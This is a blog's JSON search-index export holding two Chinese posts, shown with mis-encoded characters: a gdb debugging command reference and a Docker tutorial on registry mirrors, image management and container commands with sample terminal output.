{"meta":{"title":"LeonChow","subtitle":"","description":"","author":"Chow","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"gdbå‘½ä»¤ä½¿ç”¨","slug":"gdbå‘½ä»¤ä½¿ç”¨","date":"2025-06-05T12:10:46.000Z","updated":"2025-06-06T04:50:33.423Z","comments":true,"path":"2025/06/05/gdbå‘½ä»¤ä½¿ç”¨/","permalink":"http://example.com/2025/06/05/gdb%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/","excerpt":"","text":"åœ¨ç¨‹åºç¼–è¯‘æ—¶å¢åŠ -gé€‰é¡¹ä»¥æ”¯æŒgdbè°ƒè¯• å¦‚ï¼š $ gcc -g example.c -o example.x é€šè¿‡ä¸Šè¿°å‘½ä»¤å¯¹example.cç¼–è¯‘ä¹‹åï¼Œä½¿ç”¨ä¸‹åˆ—å‘½ä»¤è¿›å…¥åˆ°gdbè°ƒè¯•ï¼š $ gdb example.x åœ¨gdbè°ƒè¯•ä¸­ï¼Œå¸¸ç”¨çš„å‘½ä»¤æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š $ list ç¼©ç•¥ä¸º l åˆ—å‡ºç¨‹åºæºç ï¼Œæ¯æ¬¡åˆ—å‡º10è¡Œï¼ŒæŒ‰å›è½¦é‡å¤è¿è¡Œä¸Šä¸€å‘½ä»¤ï¼› $ run ç¼©ç•¥ä¸º r ç¨‹åºå¼€å§‹è¿è¡Œï¼Œåœ¨råå¯ä»¥åŠ å…¥ç¨‹åºå¯åŠ¨å‚æ•°ï¼Œç¨‹åºè¿è¡Œåˆ°æ–­ç‚¹å¤„æš‚åœï¼› $ continue ç¼©ç•¥ä¸º c ç¨‹åºç»§ç»­è¿è¡Œï¼Œåˆ°ä¸‹ä¸€æ–­ç‚¹å¤„æš‚åœï¼› å•æ­¥è°ƒè¯• $ step ç¼©ç•¥ä¸ºs $ next ç¼©ç•¥ä¸º n ç¨‹åºç»§ç»­è¿è¡Œåˆ°ä¸‹ä¸€æ–­ç‚¹ï¼› $ break ç¼©ç•¥ä¸º b åœ¨ç¨‹åºæŸä¸€ä½ç½®è®¾ç½®æ–­ç‚¹ï¼› $ info break ç¼©ç•¥ä¸º i b æŸ¥çœ‹æ–­ç‚¹ä¿¡æ¯ï¼› è®¾ç½®&#x2F;æŸ¥çœ‹è¿è¡Œå‚æ•° $ set args â€”&#x2F;show args åŠ è½½è¿è¡Œä¸­çš„è¿›ç¨‹è¿›è¡Œè°ƒè¯•(Attach to the running process to be debugged.)ï¼š $ gdb attatch pid Specifying source directories $ dir dirname â€¦ ä»¥åå…­è¿›åˆ¶è¾“å‡ºå†…å­˜å—æ•°æ® $ x&#x2F;28hx â€” æ®µé”™è¯¯è°ƒè¯•ï¼Œcoreæ–‡ä»¶æ ·ä¾‹ é€šè¿‡ulimitå‘½ä»¤æŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿæ˜¯å¦é…ç½®æ”¯æŒäº†dump coreçš„åŠŸèƒ½ã€‚é€šè¿‡ulimit -cæˆ–ulimit -aï¼Œå¯ä»¥æŸ¥çœ‹core fileå¤§å°çš„é…ç½®æƒ…å†µï¼Œå¦‚æœä¸º0ï¼Œåˆ™è¡¨ç¤ºç³»ç»Ÿå…³é—­äº†dump coreï¼›å¯ä»¥é€šè¿‡ulimit -c unlimitedæ¥æ‰“å¼€ã€‚è‹¥å‘ç”Ÿäº†æ®µé”™è¯¯ï¼Œä½†æ²¡æœ‰core dumpï¼Œæ˜¯ç”±äºç³»ç»Ÿç¦æ­¢coreæ–‡ä»¶çš„ç”Ÿæˆã€‚ $ gdb [exec file] [core file] æŸ¥çœ‹å †æ ˆä¿¡æ¯ï¼š $ bt PSï¼šå¯¹äºpythonç¨‹åºåœ¨linuxä¸‹å¯ä»¥ä½¿ç”¨pdbåšè°ƒè¯•ï¼ Published by Windows Livewriter. è°ƒè¯•å¼€å§‹æ—¶ï¼Œå¿…é¡»å…ˆè½½å…¥è¦è¿›è¡Œè°ƒè¯•çš„ç¨‹åºï¼Œå¯ä»¥ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼š * åœ¨å¯åŠ¨gdbåæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š file å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ * åœ¨gdbå¯åŠ¨æ—¶å°±è½½å…¥ç¨‹åºï¼š gdb å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ è½½å…¥ç¨‹åºåï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¦è¿›è¡Œæ–­ç‚¹çš„è®¾ç½®ï¼Œè¦ç›‘è§†çš„å˜é‡çš„æ·»åŠ ç­‰å·¥ä½œï¼Œä¸‹é¢å¯¹åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¸¸ä¼šç”¨åˆ°çš„å‘½ä»¤é€ä¸€è¿›è¡Œä»‹ç»ï¼š * list ï¼šæ˜¾ç¤ºç¨‹åºä¸­çš„ä»£ç ï¼Œå¸¸ç”¨ä½¿ç”¨æ ¼å¼æœ‰ï¼š list è¾“å‡ºä»ä¸Šæ¬¡è°ƒç”¨listå‘½ä»¤å¼€å§‹å¾€åçš„10è¡Œç¨‹åºä»£ç ã€‚ list - è¾“å‡ºä»ä¸Šæ¬¡è°ƒç”¨listå‘½ä»¤å¼€å§‹å¾€å‰çš„10è¡Œç¨‹åºä»£ç ã€‚ list n è¾“å‡ºç¬¬nè¡Œé™„è¿‘çš„10è¡Œç¨‹åºä»£ç ã€‚ list function è¾“å‡ºå‡½æ•°functionå‰åçš„10è¡Œç¨‹åºä»£ç ã€‚ * forward&#x2F;search ï¼šä»å½“å‰è¡Œå‘åæŸ¥æ‰¾åŒ¹é…æŸä¸ªå­—ç¬¦ä¸²çš„ç¨‹åºè¡Œã€‚ä½¿ç”¨æ ¼å¼ï¼š forward&#x2F;search å­—ç¬¦ä¸² æŸ¥æ‰¾åˆ°çš„è¡Œå·å°†ä¿å­˜åœ¨$_å˜é‡ä¸­ï¼Œå¯ä»¥ç”¨print $_å‘½ä»¤æ¥æŸ¥çœ‹ã€‚ * reverse-search ï¼šå’Œforward&#x2F;searchç›¸åï¼Œå‘å‰æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚ä½¿ç”¨æ ¼å¼åŒä¸Šã€‚ * break ï¼šåœ¨ç¨‹åºä¸­è®¾ç½®æ–­ç‚¹ï¼Œå½“ç¨‹åºè¿è¡Œåˆ°æŒ‡å®šè¡Œä¸Šæ—¶ï¼Œä¼šæš‚åœæ‰§è¡Œã€‚ä½¿ç”¨æ ¼å¼ï¼š break è¦è®¾ç½®æ–­ç‚¹çš„è¡Œå· * tbreak ï¼šè®¾ç½®ä¸´æ—¶æ–­ç‚¹ï¼Œåœ¨è®¾ç½®ä¹‹ååªèµ·ä½œç”¨ä¸€æ¬¡ã€‚ä½¿ç”¨æ ¼å¼ï¼š tbreak è¦è®¾ç½®ä¸´æ—¶æ–­ç‚¹çš„è¡Œå· * clear ï¼šå’Œbreakç›¸åï¼Œclearç”¨äºæ¸…é™¤æ–­ç‚¹ã€‚ä½¿ç”¨æ ¼å¼ï¼š clear è¦æ¸…é™¤çš„æ–­ç‚¹æ‰€åœ¨çš„è¡Œå· * run ï¼šå¯åŠ¨ç¨‹åºï¼Œåœ¨runåé¢å¸¦ä¸Šå‚æ•°å¯ä»¥ä¼ é€’ç»™æ­£åœ¨è°ƒè¯•çš„ç¨‹åºã€‚ * awatch ï¼šç”¨æ¥å¢åŠ ä¸€ä¸ªè§‚å¯Ÿç‚¹(add watch)ï¼Œä½¿ç”¨æ ¼å¼ï¼š awatch å˜é‡æˆ–è¡¨è¾¾å¼ å½“è¡¨è¾¾å¼çš„å€¼å‘ç”Ÿæ”¹å˜æˆ–è¡¨è¾¾å¼çš„å€¼è¢«è¯»å–æ—¶ï¼Œç¨‹åºå°±ä¼šåœæ­¢è¿è¡Œã€‚ * watch ï¼šä¸awatchç±»ä¼¼ç”¨æ¥è®¾ç½®è§‚å¯Ÿç‚¹ï¼Œä½†ç¨‹åºåªæœ‰å½“è¡¨è¾¾å¼çš„å€¼å‘ç”Ÿæ”¹å˜æ—¶æ‰ä¼šåœæ­¢è¿è¡Œã€‚ä½¿ç”¨æ ¼ å¼ï¼š watch å˜é‡æˆ–è¡¨è¾¾å¼ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œawatchå’Œwatchéƒ½å¿…é¡»åœ¨ç¨‹åºè¿è¡Œçš„è¿‡ç¨‹ä¸­è®¾ç½®è§‚å¯Ÿç‚¹ï¼Œå³å¯è¿è¡Œrunä¹‹åæ‰èƒ½è®¾ç½®ã€‚ *** commands ï¼šè®¾ç½®åœ¨é‡åˆ°æ–­ç‚¹åæ‰§è¡Œç‰¹å®šçš„æŒ‡ä»¤ã€‚**ä½¿ç”¨æ ¼å¼æœ‰ï¼š commands è®¾ç½®é‡åˆ°æœ€åä¸€ä¸ªé‡åˆ°çš„æ–­ç‚¹æ—¶è¦æ‰§è¡Œçš„å‘½ä»¤ commands n è®¾ç½®é‡åˆ°æ–­ç‚¹å·næ—¶è¦æ‰§è¡Œçš„å‘½ä»¤ æ³¨æ„ï¼Œcommandsåé¢è·Ÿçš„æ˜¯æ–­ç‚¹å·ï¼Œè€Œä¸æ˜¯æ–­ç‚¹æ‰€åœ¨çš„è¡Œå·ã€‚ åœ¨è¾“å…¥å‘½ä»¤åï¼Œå°±å¯ä»¥è¾“å…¥é‡åˆ°æ–­ç‚¹åè¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œæ¯è¡Œä¸€æ¡å‘½ä»¤ï¼Œåœ¨è¾“å…¥æœ€åä¸€æ¡å‘½ä»¤åè¾“å…¥endå°±å¯ä»¥ç»“æŸè¾“å…¥ã€‚ * delete ï¼šæ¸…é™¤æ–­ç‚¹æˆ–è‡ªåŠ¨æ˜¾ç¤ºçš„è¡¨è¾¾å¼ã€‚ä½¿ç”¨æ ¼å¼ï¼š delete æ–­ç‚¹å· * disable ï¼šè®©æŒ‡å®šæ–­ç‚¹å¤±æ•ˆã€‚ä½¿ç”¨æ ¼å¼ï¼š disable æ–­ç‚¹å·åˆ—è¡¨ æ–­ç‚¹å·ä¹‹é—´ç”¨ç©ºæ ¼é—´éš”å¼€ã€‚ * enable ï¼šå’Œdisableç›¸åï¼Œæ¢å¤å¤±æ•ˆçš„æ–­ç‚¹ã€‚ä½¿ç”¨æ ¼å¼ï¼š enable æ–­ç‚¹ç¼–å·åˆ—è¡¨ * ignore ï¼šå¿½ç•¥æ–­ç‚¹ã€‚ä½¿ç”¨æ ¼å¼ï¼š ignore æ–­ç‚¹å· å¿½ç•¥æ¬¡æ•° * condition ï¼šè®¾ç½®æ–­ç‚¹åœ¨ä¸€å®šæ¡ä»¶ä¸‹æ‰èƒ½ç”Ÿæ•ˆã€‚ä½¿ç”¨æ ¼å¼ï¼š condition æ–­ç‚¹å· æ¡ä»¶è¡¨è¾¾å¼ * cont&#x2F;continue ï¼šä½¿ç¨‹åºåœ¨æš‚åœåœ¨æ–­ç‚¹ä¹‹åç»§ç»­è¿è¡Œã€‚ä½¿ç”¨æ ¼å¼ï¼š cont è·³è¿‡å½“å‰æ–­ç‚¹ç»§ç»­è¿è¡Œã€‚ cont n è·³è¿‡næ¬¡æ–­ç‚¹ï¼Œç»§ç»­è¿è¡Œã€‚ å½“nä¸º1æ—¶ï¼Œcont 1å³ä¸ºcontã€‚ * jump ï¼šè®©ç¨‹åºè·³åˆ°æŒ‡å®šè¡Œå¼€å§‹è°ƒè¯•ã€‚ä½¿ç”¨æ ¼å¼ï¼š jump è¡Œå· *** next ï¼šç»§ç»­æ‰§è¡Œè¯­å¥ï¼Œä½†æ˜¯è·³è¿‡å­ç¨‹åºçš„è°ƒç”¨**ã€‚ä½¿ç”¨æ ¼å¼ï¼š next æ‰§è¡Œä¸€æ¡è¯­å¥ next n æ‰§è¡Œnæ¡è¯­å¥ * nexti ï¼šå•æ­¥æ‰§è¡Œè¯­å¥ï¼Œä½†å’Œnextä¸åŒçš„æ˜¯ï¼Œå®ƒä¼šè·Ÿè¸ªåˆ°å­ç¨‹åºçš„å†…éƒ¨ï¼Œä½†ä¸æ‰“å°å‡ºå­ç¨‹åºå†…éƒ¨çš„è¯­å¥ã€‚ä½¿ç”¨æ ¼å¼åŒä¸Šã€‚ * step ï¼šä¸nextç±»ä¼¼ï¼Œä½†æ˜¯å®ƒä¼šè·Ÿè¸ªåˆ°å­ç¨‹åºçš„å†…éƒ¨ï¼Œè€Œä¸”ä¼šæ˜¾ç¤ºå­ç¨‹åºå†…éƒ¨çš„æ‰§è¡Œæƒ…å†µã€‚ä½¿ç”¨æ ¼å¼åŒä¸Šã€‚ * stepi ï¼šä¸stepç±»ä¼¼ï¼Œä½†æ˜¯æ¯”stepæ›´è¯¦ç»†ï¼Œæ˜¯nextiå’Œstepçš„ç»“åˆã€‚ä½¿ç”¨æ ¼å¼åŒä¸Šã€‚ * whatis ï¼šæ˜¾ç¤ºæŸä¸ªå˜é‡æˆ–è¡¨è¾¾å¼çš„æ•°æ®ç±»å‹ã€‚ä½¿ç”¨æ ¼å¼ï¼š whatis å˜é‡æˆ–è¡¨è¾¾å¼ * ptype ï¼šå’Œwhatisç±»ä¼¼ï¼Œç”¨äºæ˜¾ç¤ºæ•°æ®ç±»å‹ï¼Œä½†æ˜¯å®ƒè¿˜å¯ä»¥æ˜¾ç¤ºtypedefå®šä¹‰çš„ç±»å‹ç­‰ã€‚ä½¿ç”¨æ ¼å¼ï¼š ptype å˜é‡æˆ–è¡¨è¾¾å¼ * set ï¼šè®¾ç½®ç¨‹åºä¸­å˜é‡çš„å€¼ã€‚ä½¿ç”¨æ ¼å¼ï¼š set å˜é‡&#x3D;è¡¨è¾¾å¼ set å˜é‡:&#x3D;è¡¨è¾¾å¼ * display ï¼šå¢åŠ è¦æ˜¾ç¤ºå€¼çš„è¡¨è¾¾å¼ã€‚ä½¿ç”¨æ ¼å¼ï¼š display è¡¨è¾¾å¼ * info display ï¼šæ˜¾ç¤ºå½“å‰æ‰€æœ‰çš„è¦æ˜¾ç¤ºå€¼çš„è¡¨è¾¾å¼ã€‚ * delete display&#x2F;undisplay ï¼šåˆ é™¤è¦æ˜¾ç¤ºå€¼çš„è¡¨è¾¾å¼ã€‚ä½¿ç”¨æ ¼å¼ï¼š delete display&#x2F;undisplay è¡¨è¾¾å¼ç¼–å· * disable display ï¼šæš‚æ—¶ä¸æ˜¾ç¤ºä¸€ä¸ªè¦è¡¨è¾¾å¼çš„å€¼ã€‚ä½¿ç”¨æ ¼å¼ï¼š disable display è¡¨è¾¾å¼ç¼–å· * enable display ï¼šä¸disable displayç›¸åï¼Œä½¿ç”¨è¡¨è¾¾å¼æ¢å¤æ˜¾ç¤ºã€‚ä½¿ç”¨æ ¼å¼ï¼š enable display è¡¨è¾¾å¼ç¼–å· *** print ï¼šæ‰“å°å˜é‡æˆ–è¡¨è¾¾å¼çš„å€¼ã€‚**ä½¿ç”¨æ ¼å¼ï¼š print å˜é‡æˆ–è¡¨è¾¾å¼ è¡¨è¾¾å¼ä¸­æœ‰ä¸¤ä¸ªç¬¦å·æœ‰ç‰¹æ®Šå«ä¹‰ï¼š$å’Œ$$ã€‚ $è¡¨ç¤ºç»™å®šåºå·çš„å‰ä¸€ä¸ªåºå·ï¼Œ$$è¡¨ç¤ºç»™å®šåºå·çš„å‰ä¸¤ä¸ªåºå·ã€‚ å¦‚æœ$å’Œ$$åé¢ä¸å¸¦æ•°å­—ï¼Œåˆ™ç»™å®šåºå·ä¸ºå½“å‰åºå·ã€‚ * backtrace ï¼šæ‰“å°æŒ‡å®šä¸ªæ•°çš„æ ˆå¸§(stack frame)ã€‚ä½¿ç”¨æ ¼å¼ï¼š backtrace æ ˆå¸§ä¸ªæ•° * frame ï¼šæ‰“å°æ ˆå¸§ã€‚ä½¿ç”¨æ ¼å¼ï¼š frame æ ˆå¸§å· * info frame ï¼šæ˜¾ç¤ºå½“å‰æ ˆå¸§çš„è¯¦ç»†ä¿¡æ¯ã€‚ * select-frame ï¼šé€‰æ‹©æ ˆå¸§ï¼Œé€‰æ‹©åå¯ä»¥ç”¨info frameæ¥æ˜¾ç¤ºæ ˆå¸§ä¿¡æ¯ã€‚ä½¿ç”¨æ ¼å¼ï¼š select-frame æ ˆå¸§å· * kill ï¼šç»“æŸå½“å‰ç¨‹åºçš„è°ƒè¯•ã€‚ * quit ï¼šé€€å‡ºgdbã€‚","categories":[],"tags":[]},{"title":"dockerå­¦ä¹ ","slug":"dockerå­¦ä¹ ","date":"2025-06-04T12:33:12.000Z","updated":"2025-06-05T02:34:42.781Z","comments":true,"path":"2025/06/04/dockerå­¦ä¹ /","permalink":"http://example.com/2025/06/04/docker%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"dockeræ‰“åŒ…ã€åˆ†å‘ã€éƒ¨ç½²æ‰“åŒ…ï¼šå°±æ˜¯æŠŠä½ è½¯ä»¶è¿è¡Œæ‰€éœ€çš„ä¾èµ–ã€ç¬¬ä¸‰æ–¹åº“ã€è½¯ä»¶æ‰“åŒ…åˆ°ä¸€èµ·ï¼Œå˜æˆä¸€ä¸ªå®‰è£…åŒ…åˆ†å‘ï¼šä½ å¯ä»¥æŠŠä½ æ‰“åŒ…å¥½çš„â€œå®‰è£…åŒ…â€ä¸Šä¼ åˆ°ä¸€ä¸ªé•œåƒä»“åº“ï¼Œå…¶ä»–äººå¯ä»¥éå¸¸æ–¹ä¾¿çš„è·å–å’Œå®‰è£…éƒ¨ç½²ï¼šæ‹¿ç€â€œå®‰è£…åŒ…â€å°±å¯ä»¥ä¸€ä¸ªå‘½ä»¤è¿è¡Œèµ·æ¥ä½ çš„åº”ç”¨ï¼Œè‡ªåŠ¨æ¨¡æ‹Ÿå‡ºä¸€æ‘¸ä¸€æ ·çš„è¿è¡Œç¯å¢ƒï¼Œä¸ç®¡æ˜¯åœ¨ Windows&#x2F;Mac&#x2F;Linuxã€‚ é•œåƒåŠ é€Ÿæº é•œåƒåŠ é€Ÿå™¨ é•œåƒåŠ é€Ÿå™¨åœ°å€ Docker ä¸­å›½å®˜æ–¹é•œåƒ https://registry.docker-cn.com DaoCloud é•œåƒç«™ http://f1361db2.m.daocloud.io Azure ä¸­å›½é•œåƒ https://dockerhub.azk8s.cn ç§‘å¤§é•œåƒç«™ https://docker.mirrors.ustc.edu.cn é˜¿é‡Œäº‘ https://ud6340vz.mirror.aliyuncs.com ä¸ƒç‰›äº‘ https://reg-mirror.qiniu.com ç½‘æ˜“äº‘ https://hub-mirror.c.163.com è…¾è®¯äº‘ https://mirror.ccs.tencentyun.com 1&quot;registry-mirrors&quot;: [&quot;https://registry.docker-cn.com&quot;] è½¯ä»¶å®‰è£… hub.docker.com Docker å¸¸ç”¨å‘½ä»¤é•œåƒçš„ç®¡ç†æœç´¢&#x2F;æ£€ç´¢1docker search é•œåƒåç§° ç¤ºä¾‹ï¼š 1234567891011[root@docker ~]# docker search nginxNAME DESCRIPTION STARS OFFICIAL AUTOMATEDnginx Official build of Nginx. 16597 [OK]bitnami/nginx Bitnami nginx Docker Image 121 [OK]ubuntu/nginx Nginx, a high-performance reverse proxy &amp; weâ€¦ 39bitnami/nginx-ingress-controller Bitnami Docker Image for NGINX Ingress Contrâ€¦ 17 [OK]rancher/nginx-ingress-controller 10ibmcom/nginx-ingress-controller Docker Image for IBM Cloud Private-CE (Commuâ€¦ 4bitnami/nginx-ldap-auth-daemon 3bitnami/nginx-exporter 2circleci/nginx This image is for internal use 2 é»˜è®¤ä» Docker Hub è¿›è¡Œæœç´¢é•œåƒã€‚ ä¸‹è½½&#x2F;æ‹‰å–1docker pull åç§°:ç‰ˆæœ¬ ç¤ºä¾‹ï¼š 1234567891011[root@docker ~]# docker pull nginx:1.21.61.21.6: Pulling from library/nginxc229119241af: Pull complete2215908dc0a2: Pull complete08c3cb2073f1: Pull complete18f38162c0ce: Pull complete10e2168f148a: Pull completec4ffe9532b5f: Pull completeDigest: sha256:2275af0f20d71b293916f1958f8497f987b8d8fd8113df54635f2a5915002bf1Status: Downloaded newer image for nginx:1.21.6docker.io/library/nginx:1.21.6 å¦‚æœä¸åŠ ç‰ˆæœ¬ï¼Œåˆ™æ‹‰å– latest ç‰ˆæœ¬ï¼Œå³æœ€æ–°ç‰ˆæœ¬ã€‚ é•œåƒåˆ—è¡¨12docker imagesdocker image ls ç¤ºä¾‹ï¼š 123456789101112[root@docker ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEnginx 1.21.6 12766a6745ee 10 days ago 142MBrancher/mirrored-flannelcni-flannel v0.17.0 9247abf08677 5 weeks ago 59.8MBrancher/mirrored-flannelcni-flannel-cni-plugin v1.0.1 ac40ce625740 2 months ago 8.1MBregistry.aliyuncs.com/google_containers/kube-apiserver v1.23.0 e6bf5ddd4098 4 months ago 135MBregistry.aliyuncs.com/google_containers/kube-controller-manager v1.23.0 37c6aeb3663b 4 months ago 125MBregistry.aliyuncs.com/google_containers/kube-scheduler v1.23.0 56c5af1d00b5 4 months ago 53.5MBregistry.aliyuncs.com/google_containers/kube-proxy v1.23.0 e03484a90585 4 months ago 112MBregistry.aliyuncs.com/google_containers/etcd 3.5.1-0 25f8c7f3da61 5 months ago 293MBregistry.aliyuncs.com/google_containers/coredns v1.8.6 a4ca41631cc7 6 months ago 46.8MBregistry.aliyuncs.com/google_containers/pause 3.6 6270bb605e12 7 months ago 683kB äº”åˆ—æ•°æ®åˆ†åˆ«ä»£è¡¨é•œåƒåç§°ã€é•œåƒç‰ˆæœ¬ã€é•œåƒ IDã€æ‹‰å–æ—¶é—´ã€é•œåƒå¤§å°ã€‚ é•œåƒæ ‡ç­¾1docker tag [imagesID] æ”¹ååç§°:æ”¹åtag ç¤ºä¾‹ï¼š 1234[root@docker ~]# docker tag nginx:1.21.6 mynginx:1.21.6[root@docker ~]# docker images |grep nginxmynginx 1.21.6 12766a6745ee 10 days ago 142MBnginx 1.21.6 12766a6745ee 10 days ago 142MB é•œåƒåˆ é™¤1docker rmi é•œåƒid ç¤ºä¾‹ï¼š 12[root@docker ~]# docker rmi mynginx:1.21.6Untagged: mynginx:1.21.6 é•œåƒå¯¼å‡º1docker save é•œåƒid/é•œåƒå &gt; åå­—.tar ç¤ºä¾‹ï¼š 123[root@docker ~]# docker save nginx:1.21.6 &gt; nginx-v1.21.6.tar[root@docker ~]# lsnginx-v1.21.6.tar é•œåƒå¯¼å…¥1docker load &lt; åŒ…å ç¤ºä¾‹ï¼š 1234567891011121314151617181920[root@docker ~]# docker rmi nginx:1.21.6Untagged: nginx:1.21.6Untagged: nginx@sha256:2275af0f20d71b293916f1958f8497f987b8d8fd8113df54635f2a5915002bf1Deleted: sha256:12766a6745eea133de9fdcd03ff720fa971fdaf21113d4bc72b417c123b15619Deleted: sha256:3ea962f6f388096ab9798790d363fc6f9c779c924a5eddf5c699d8da080114f7Deleted: sha256:091a2aef7242e42505b69f1ad027d6a442cfce2403e260ac914f0fd6cc2d275fDeleted: sha256:4e72a31f1cd6fd655cc0826c91e886967b6e965e13ac21f31f9f66c27a3b7732Deleted: sha256:e3d1cdf9772a260b3e81a22c1940d63ac45dfe67720f78f00ca73834d9498934Deleted: sha256:af40da71a8618ea9cbcdc333d5e60bd5b6df820f0d07a55f7c9a1c21fd930095Deleted: sha256:608f3a074261105f129d707e4d9ad3d41b5baa94887f092b7c2857f7274a2fce[root@docker ~]# docker load &lt; nginx-v1.21.6.tar608f3a074261: Loading layer [==================================================&gt;] 83.9MB/83.9MBea207a4854e7: Loading layer [==================================================&gt;] 62MB/62MB33cf1b723f65: Loading layer [==================================================&gt;] 3.072kB/3.072kB5c77d760e1f4: Loading layer [==================================================&gt;] 4.096kB/4.096kBfac199a5a1a5: Loading layer [==================================================&gt;] 3.584kB/3.584kBea4bc0cd4a93: Loading layer [==================================================&gt;] 7.168kB/7.168kBLoaded image: nginx:1.21.6[root@docker ~]# docker images |grep nginxnginx 1.21.6 12766a6745ee 10 days ago 142MB å®¹å™¨çš„ç®¡ç†åˆ›å»ºå®¹å™¨1docker run [options] image [command] [arg] Option è¯´æ˜ï¼š -d: åå°è¿è¡Œ -i: ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œé€šå¸¸ä¸ -t åŒæ—¶ä½¿ç”¨ -t: ä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å‡ºç»ˆç«¯ï¼Œé€šå¸¸ä¸ -i åŒæ—¶ä½¿ç”¨ --name: è®¾ç½®å®¹å™¨åå­— --net: æŒ‡å®šç½‘ç»œè¿æ¥ç±»å‹ --h: è®¾ç½®ä¸»æœºåç§° --dns: æŒ‡å®šå®¹å™¨çš„ DNS æœåŠ¡å™¨ï¼Œé»˜è®¤å’Œå®¿ä¸»ä¸€è‡´ -e: è®¾ç½®ç¯å¢ƒå˜é‡ï¼ˆ&#x3D;â€â€ï¼‰ -p: æœ¬åœ°ç«¯å£:å®¹å™¨ç«¯å£ï¼ŒæŠŠå®¹å™¨çš„æŸä¸ªç«¯å£æš´éœ²åˆ°ä¸»æœºçš„æŸä¸ªç«¯å£ -v: æœ¬åœ°ç›®å½•:å®¹å™¨ç›®å½•ï¼ŒæŠŠä¸»æœºçš„æŸç›®å½•æŒ‚è½½åˆ°å®¹å™¨çš„ç›®å½•é‡Œé¢å®ç°æ–‡ä»¶ç³»ç»Ÿçš„é“¾æ¥ --network: æŒ‡å®šç½‘ç»œ --rm: å®¹å™¨å…³é—­åè‡ªåŠ¨åˆ é™¤ ç¤ºä¾‹ï¼šä½¿ç”¨å‘½ä»¤ docker run -p 8080:80 -d --name nginx1 nginx æ¥è¿è¡Œä¸€ä¸ª Nginx å®¹å™¨ï¼Œå¹¶ä¸”æŠŠå®¹å™¨çš„ 80 ç«¯å£æš´éœ²åˆ°æœ¬æœºçš„ 8080ï¼š 123456789101112[root@docker ~]# docker run -p 8080:80 -d --name nginx1 nginxUnable to find image &#x27;nginx:latest&#x27; locallylatest: Pulling from library/nginx1fe172e4850f: Pull complete35c195f487df: Pull complete213b9b16f495: Pull completea8172d9e19b9: Pull completef5eee2cb2150: Pull complete93e404ba8667: Pull completeDigest: sha256:859ab6768a6f26a79bc42b231664111317d095a4f04e4b6fe79ce37b3d199097Status: Downloaded newer image for nginx:latest4cf61416ee672b595b99436d0fdcf8ebe5e6d22adaed8838b29e978f19372ecb å®¹å™¨çš„åˆ›å»ºè¿‡ç¨‹æ˜¯å…ˆåˆ°æœ¬åœ°æŸ¥æ‰¾é•œåƒï¼Œå¦‚æœæ²¡æœ‰åˆ™å» Docker Hub é•œåƒä»“åº“æ‹‰å–é•œåƒåå†è¿è¡Œã€‚ å®¹å™¨åˆ—è¡¨ä½¿ç”¨å‘½ä»¤ docker ps æ¥æŸ¥çœ‹å·²ç»å¯åŠ¨çš„å®¹å™¨ï¼Œå¦‚æœæœ‰åœæ­¢è¿è¡Œçš„å®¹å™¨å¯ä»¥æ·»åŠ  -a å‚æ•°æ¥æŸ¥çœ‹ï¼š 123[root@docker ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4cf61416ee67 nginx &quot;/docker-entrypoint.â€¦&quot; 3 minutes ago Up 3 minutes 0.0.0.0:8080-&gt;80/tcp, :::8080-&gt;80/tcp nginx1 å…³é—­å®¹å™¨ä½¿ç”¨å‘½ä»¤ docker stop &#123;å®¹å™¨ID|å®¹å™¨åç§°&#125; æ¥å…³é—­å®¹å™¨ï¼š 1234[root@docker ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4cf61416ee67 nginx &quot;/docker-entrypoint.â€¦&quot; 6 minutes ago Exited (0) 4 seconds ago nginx158e6c5af6efe hello-world &quot;/hello&quot; 12 hours ago Exited (0) 12 hours ago great_chatterjee å¯åŠ¨å®¹å™¨ä½¿ç”¨å‘½ä»¤ docker start &#123;å®¹å™¨ID|å®¹å™¨åç§°&#125; æ¥å¼€å¯å®¹å™¨ï¼š 123[root@docker ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4cf61416ee67 nginx &quot;/docker-entrypoint.â€¦&quot; 7 minutes ago Up 6 seconds 0.0.0.0:8080-&gt;80/tcp, :::8080-&gt;80/tcp nginx1 é‡å¯å®¹å™¨ä½¿ç”¨å‘½ä»¤ docker restart &#123;å®¹å™¨ID|å®¹å™¨åç§°&#125; æ¥é‡å¯å®¹å™¨ã€‚ è¿›å…¥å®¹å™¨ä½¿ç”¨å‘½ä»¤ docker exec -it &#123;å®¹å™¨ID|å®¹å™¨åç§°&#125; /bin/sh æ¥è¿›å…¥å®¹å™¨ï¼Œ/bin/sh æ˜¯æŒ‡å®šè¿›å…¥å®¹å™¨æ—¶ç”¨çš„ç»ˆç«¯ï¼Œå¦‚æœå®¹å™¨å†…æœ‰å…¶ä»–ç»ˆç«¯å¯ä»¥è‡ªè¡Œä¿®æ”¹ï¼š 1234567[root@docker ~]# docker exec -it nginx1 /bin/sh# exit[root@docker ~]# docker exec -it nginx1 /bin/bashroot@4cf61416ee67:/# lsbin boot dev docker-entrypoint.d docker-entrypoint.sh etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr varroot@4cf61416ee67:/# exitexit å®¹å™¨åˆ é™¤ä½¿ç”¨å‘½ä»¤ docker rm &#123;å®¹å™¨ID|å®¹å™¨åç§°&#125; æ¥åˆ é™¤å·²ç»å…³é—­çš„å®¹å™¨ï¼Œå¦‚æœå®¹å™¨åœ¨è¿è¡Œä¸­æƒ³è¦å¼ºåˆ¶åˆ 